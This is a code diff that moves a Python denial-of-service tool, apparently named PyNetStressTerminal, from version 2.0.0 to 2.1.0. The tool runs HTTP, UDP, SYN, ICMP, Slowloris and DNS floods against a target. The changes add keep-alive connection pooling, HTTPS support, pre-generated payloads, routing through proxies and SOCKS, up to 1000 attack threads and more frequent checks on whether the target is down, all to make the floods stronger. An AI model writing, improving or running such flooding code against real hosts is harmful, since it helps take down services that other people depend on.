@@ -41,7 +41,7 @@ colorama.init()
 DEBUG_MODE = False
 IS_TERMUX = 'com.termux' in os.environ.get('PREFIX', '')
 IS_ROOT = os.geteuid() == 0 if os.name == 'posix' else False
-VERSION = "2.0.0"
+VERSION = "2.1.0"
 
 TARGET_COLORS = {
     "down": Fore.RED,
@@ -78,6 +78,8 @@ class PyNetStressTerminal:
         self.local_server = None
         self.clients = []
         self.encryption_key = hashlib.sha256(b"default_key").digest()
+        self.connection_pool = []
+        self.pre_generated_packets = []
         
         logging.basicConfig(
             level=logging.DEBUG if DEBUG_MODE else logging.INFO,
@@ -145,7 +147,10 @@ class PyNetStressTerminal:
     def resolve_target(self, target):
         try:
             if not re.match(r"^https?://", target):
-                target = "http://" + target
+                if self.target_port == 443:
+                    target = "https://" + target
+                else:
+                    target = "http://" + target
             
             parsed = urlparse(target)
             domain = parsed.netloc or parsed.path
@@ -165,7 +170,11 @@ class PyNetStressTerminal:
             start_time = time.time()
             
             try:
-                conn = http.client.HTTPConnection(self.target_ip, self.target_port, timeout=5)
+                if self.target_port == 443:
+                    conn = http.client.HTTPSConnection(self.target_ip, self.target_port, timeout=5)
+                else:
+                    conn = http.client.HTTPConnection(self.target_ip, self.target_port, timeout=5)
+                
                 conn.request("HEAD", "/")
                 response = conn.getresponse()
                 response_time = (time.time() - start_time) * 1000
@@ -244,6 +253,47 @@ class PyNetStressTerminal:
         
         return f"http://{proxy}"
     
+    def pre_generate_packets(self, count=1000):
+        self.pre_generated_packets = []
+        
+        for _ in range(count):
+            payload = os.urandom(random.randint(64, 1024))
+            self.pre_generated_packets.append(payload)
+    
+    def get_connection(self):
+        if len(self.connection_pool) > 0:
+            return self.connection_pool.pop()
+        
+        try:
+            proxy = self.get_proxy() if self.use_proxies else None
+            
+            if proxy:
+                parsed = urlparse(proxy)
+                if self.target_port == 443:
+                    conn = http.client.HTTPSConnection(parsed.hostname, parsed.port)
+                else:
+                    conn = http.client.HTTPConnection(parsed.hostname, parsed.port)
+                
+                if self.proxy_auth:
+                    conn.set_tunnel(self.target_ip, self.target_port, 
+                                  {"Proxy-Authorization": f"Basic {self.proxy_auth}"})
+                else:
+                    conn.set_tunnel(self.target_ip, self.target_port)
+            else:
+                if self.target_port == 443:
+                    conn = http.client.HTTPSConnection(self.target_ip, self.target_port)
+                else:
+                    conn = http.client.HTTPConnection(self.target_ip, self.target_port)
+            
+            return conn
+        except Exception as e:
+            self.log(f"Connection error: {e}", "debug")
+            return None
+    
+    def return_connection(self, conn):
+        if conn:
+            self.connection_pool.append(conn)
+    
     def http_flood(self):
         self.print_status("Starting HTTP Flood attack", "info")
         
@@ -263,21 +313,15 @@ class PyNetStressTerminal:
         def http_worker():
             local_count = 0
             local_bytes = 0
+            conn = None
             
             while time.time() < end_time and self.running:
                 try:
-                    proxy = self.get_proxy() if self.use_proxies else None
-                    
-                    if proxy:
-                        parsed = urlparse(proxy)
-                        conn = http.client.HTTPConnection(parsed.hostname, parsed.port)
-                        if self.proxy_auth:
-                            conn.set_tunnel(self.target_ip, self.target_port, 
-                                          {"Proxy-Authorization": f"Basic {self.proxy_auth}"})
-                        else:
-                            conn.set_tunnel(self.target_ip, self.target_port)
-                    else:
-                        conn = http.client.HTTPConnection(self.target_ip, self.target_port)
+                    if not conn:
+                        conn = self.get_connection()
+                        if not conn:
+                            time.sleep(0.1)
+                            continue
                     
                     method = random.choice(methods)
                     path = random.choice(paths)
@@ -286,7 +330,7 @@ class PyNetStressTerminal:
                         'Host': host,
                         'User-Agent': random.choice(user_agents),
                         'Accept': '*/*',
-                        'Connection': 'close'
+                        'Connection': 'keep-alive'
                     }
                     
                     conn.request(method, path, headers=headers)
@@ -296,16 +340,25 @@ class PyNetStressTerminal:
                     local_count += 1
                     local_bytes += len(str(headers)) + len(path) + 10
                     
-                    if local_count % 10 == 0:
+                    if local_count % 50 == 0:
                         with threading.Lock():
                             self.attack_stats['requests_sent'] += local_count
                             self.attack_stats['bytes_sent'] += local_bytes
                             local_count = 0
                             local_bytes = 0
                     
-                    conn.close()
                 except Exception as e:
+                    if conn:
+                        try:
+                            conn.close()
+                        except:
+                            pass
+                        conn = None
+                    
                     self.log(f"HTTP worker error: {e}", "debug")
+            
+            if conn:
+                self.return_connection(conn)
             
             if local_count > 0:
                 with threading.Lock():
@@ -313,7 +366,7 @@ class PyNetStressTerminal:
                     self.attack_stats['bytes_sent'] += local_bytes
         
         threads = []
-        for i in range(min(500, self.thread_count * self.bot_count)):
+        for i in range(min(1000, self.thread_count * self.bot_count)):
             t = threading.Thread(target=http_worker)
             t.daemon = True
             t.start()
@@ -325,6 +378,12 @@ class PyNetStressTerminal:
         except KeyboardInterrupt:
             self.running = False
         
+        for conn in self.connection_pool:
+            try:
+                conn.close()
+            except:
+                pass
+        
         self.print_status("HTTP Flood completed", "success")
     
     def udp_flood(self):
@@ -333,6 +392,7 @@ class PyNetStressTerminal:
             return
         
         self.print_status("Starting UDP Flood attack", "info")
+        self.pre_generate_packets(5000)
         start_time = time.time()
         end_time = start_time + self.duration
         
@@ -343,6 +403,7 @@ class PyNetStressTerminal:
             while time.time() < end_time and self.running:
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.settimeout(0.1)
                     
                     if self.use_proxies and self.proxies:
                         proxy = random.choice(self.proxies)
@@ -351,13 +412,13 @@ class PyNetStressTerminal:
                             sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                             sock.set_proxy(socks.SOCKS5, host, int(port))
                     
-                    payload = os.urandom(random.randint(64, 1024))
+                    payload = random.choice(self.pre_generated_packets)
                     sock.sendto(payload, (self.target_ip, self.target_port))
                     
                     local_count += 1
                     local_bytes += len(payload)
                     
-                    if local_count % 50 == 0:
+                    if local_count % 100 == 0:
                         with threading.Lock():
                             self.attack_stats['packets_sent'] += local_count
                             self.attack_stats['bytes_sent'] += local_bytes
@@ -374,7 +435,7 @@ class PyNetStressTerminal:
                     self.attack_stats['bytes_sent'] += local_bytes
         
         threads = []
-        for i in range(min(500, self.thread_count * self.bot_count)):
+        for i in range(min(1000, self.thread_count * self.bot_count)):
             t = threading.Thread(target=udp_worker)
             t.daemon = True
             t.start()
@@ -470,7 +531,7 @@ class PyNetStressTerminal:
                     
                     local_count += 1
                     
-                    if local_count % 50 == 0:
+                    if local_count % 100 == 0:
                         with threading.Lock():
                             self.attack_stats['packets_sent'] += local_count
                             local_count = 0
@@ -484,7 +545,7 @@ class PyNetStressTerminal:
                     self.attack_stats['packets_sent'] += local_count
         
         threads = []
-        for i in range(min(200, self.thread_count * self.bot_count)):
+        for i in range(min(500, self.thread_count * self.bot_count)):
             t = threading.Thread(target=syn_worker)
             t.daemon = True
             t.start()
@@ -546,7 +607,7 @@ class PyNetStressTerminal:
                     local_count += 1
                     local_bytes += len(packet)
                     
-                    if local_count % 50 == 0:
+                    if local_count % 100 == 0:
                         with threading.Lock():
                             self.attack_stats['packets_sent'] += local_count
                             self.attack_stats['bytes_sent'] += local_bytes
@@ -563,7 +624,7 @@ class PyNetStressTerminal:
                     self.attack_stats['bytes_sent'] += local_bytes
         
         threads = []
-        for i in range(min(200, self.thread_count * self.bot_count)):
+        for i in range(min(500, self.thread_count * self.bot_count)):
             t = threading.Thread(target=icmp_worker)
             t.daemon = True
             t.start()
@@ -589,7 +650,7 @@ class PyNetStressTerminal:
                 "Accept-language: en-US,en,q=0.5"
             ]
             
-            for i in range(150):
+            for i in range(100):
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(3)
@@ -625,7 +686,7 @@ class PyNetStressTerminal:
                         except:
                             pass
                 
-                time.sleep(15)
+                time.sleep(10)
             
             for s in sockets:
                 try:
@@ -634,7 +695,7 @@ class PyNetStressTerminal:
                     pass
         
         threads = []
-        for i in range(min(50, self.bot_count)):
+        for i in range(min(100, self.bot_count)):
             t = threading.Thread(target=slowloris_worker)
             t.daemon = True
             t.start()
@@ -675,7 +736,7 @@ class PyNetStressTerminal:
             while time.time() < end_time and self.running:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.settimeout(1)
+                    s.settimeout(0.1)
                     
                     s.bind(('0.0.0.0', 0))
                     
@@ -685,7 +746,7 @@ class PyNetStressTerminal:
                     local_count += 1
                     local_bytes += len(query)
                     
-                    if local_count % 50 == 0:
+                    if local_count % 100 == 0:
                         with threading.Lock():
                             self.attack_stats['packets_sent'] += local_count
                             self.attack_stats['bytes_sent'] += local_bytes
@@ -702,7 +763,7 @@ class PyNetStressTerminal:
                     self.attack_stats['bytes_sent'] += local_bytes
         
         threads = []
-        for i in range(min(500, self.thread_count * self.bot_count)):
+        for i in range(min(1000, self.thread_count * self.bot_count)):
             t = threading.Thread(target=dns_worker)
             t.daemon = True
             t.start()
@@ -805,7 +866,7 @@ class PyNetStressTerminal:
             else:
                 data_text = f"{bytes_sent} B"
             
-            if int(elapsed) % 10 == 0:
+            if int(elapsed) % 5 == 0:
                 status = self.check_target_status()
                 self.attack_stats['target_status'] = status
             
@@ -813,7 +874,7 @@ class PyNetStressTerminal:
             sys.stdout.write(f"\r{Fore.CYAN}[STATS]{Style.RESET_ALL} Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text} | Status: {TARGET_COLORS[self.attack_stats['target_status']]}{self.attack_stats['target_status'].upper()}{Style.RESET_ALL}")
             sys.stdout.flush()
             
-            time.sleep(1)
+            time.sleep(0.5)
         
         elapsed = time.time() - start_time
         packets = self.attack_stats['packets_sent']
